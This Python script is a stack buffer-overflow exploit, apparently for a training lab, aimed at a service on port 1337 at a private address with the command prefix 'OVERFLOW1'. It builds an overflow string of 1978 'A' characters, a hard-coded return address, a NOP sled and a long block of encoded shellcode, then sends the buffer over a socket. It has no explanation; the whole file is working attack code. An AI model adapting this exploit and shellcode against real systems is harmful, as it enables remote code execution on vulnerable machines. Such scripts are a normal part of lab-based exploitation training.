#!/usr/bin/python3

import socket

class exploit():
	def __init__(self):
		self.prefix = "OVERFLOW1 "
		self.offset = 1978
		self.overflow = "A" * self.offset
		self.retn = "\xaf\x11\x50\x62"
		self.padding = "\x90" * 16
		self.postfix = ""
		self.payload = ("\xdb\xd7\xbd\xcb\x6b\xd3\xe7\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
				"\x52\x31\x68\x17\x83\xe8\xfc\x03\xa3\x78\x31\x12\xcf\x97\x37"
				"\xdd\x2f\x68\x58\x57\xca\x59\x58\x03\x9f\xca\x68\x47\xcd\xe6"
				"\x03\x05\xe5\x7d\x61\x82\x0a\x35\xcc\xf4\x25\xc6\x7d\xc4\x24"
				"\x44\x7c\x19\x86\x75\x4f\x6c\xc7\xb2\xb2\x9d\x95\x6b\xb8\x30"
				"\x09\x1f\xf4\x88\xa2\x53\x18\x89\x57\x23\x1b\xb8\xc6\x3f\x42"
				"\x1a\xe9\xec\xfe\x13\xf1\xf1\x3b\xed\x8a\xc2\xb0\xec\x5a\x1b"
				"\x38\x42\xa3\x93\xcb\x9a\xe4\x14\x34\xe9\x1c\x67\xc9\xea\xdb"
				"\x15\x15\x7e\xff\xbe\xde\xd8\xdb\x3f\x32\xbe\xa8\x4c\xff\xb4"
				"\xf6\x50\xfe\x19\x8d\x6d\x8b\x9f\x41\xe4\xcf\xbb\x45\xac\x94"
				"\xa2\xdc\x08\x7a\xda\x3e\xf3\x23\x7e\x35\x1e\x37\xf3\x14\x77"
				"\xf4\x3e\xa6\x87\x92\x49\xd5\xb5\x3d\xe2\x71\xf6\xb6\x2c\x86"
				"\xf9\xec\x89\x18\x04\x0f\xea\x31\xc3\x5b\xba\x29\xe2\xe3\x51"
				"\xa9\x0b\x36\xf5\xf9\xa3\xe9\xb6\xa9\x03\x5a\x5f\xa3\x8b\x85"
				"\x7f\xcc\x41\xae\xea\x37\x02\xdb\xec\x0e\x82\xb3\xf2\x70\x33"
				"\x18\x7a\x96\x59\xb0\x2a\x01\xf6\x29\x77\xd9\x67\xb5\xad\xa4"
				"\xa8\x3d\x42\x59\x66\xb6\x2f\x49\x1f\x36\x7a\x33\xb6\x49\x50"
				"\x5b\x54\xdb\x3f\x9b\x13\xc0\x97\xcc\x74\x36\xee\x98\x68\x61"
				"\x58\xbe\x70\xf7\xa3\x7a\xaf\xc4\x2a\x83\x22\x70\x09\x93\xfa"
				"\x79\x15\xc7\x52\x2c\xc3\xb1\x14\x86\xa5\x6b\xcf\x75\x6c\xfb"
				"\x96\xb5\xaf\x7d\x97\x93\x59\x61\x26\x4a\x1c\x9e\x87\x1a\xa8"
				"\xe7\xf5\xba\x57\x32\xbe\xdb\xb5\x96\xcb\x73\x60\x73\x76\x1e"
				"\x93\xae\xb5\x27\x10\x5a\x46\xdc\x08\x2f\x43\x98\x8e\xdc\x39"
				"\xb1\x7a\xe2\xee\xb2\xae")

		self.buffer = self.prefix + self.overflow + self.retn + self.padding + self.payload + self.postfix

	# Create a socket and connecto the target machine
	def sendExploit(self):
		ip = "10.10.74.132"
		port = 1337
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			s.connect((ip, port))
			print("Sending evil buffer...")
			s.send(bytes(self.buffer + "\r\n", "latin-1"))
			print("Done!")
		except:
			print("Could not connect.")

def main():
	p = exploit()
	p.sendExploit()

if __name__ == "__main__":
	main()
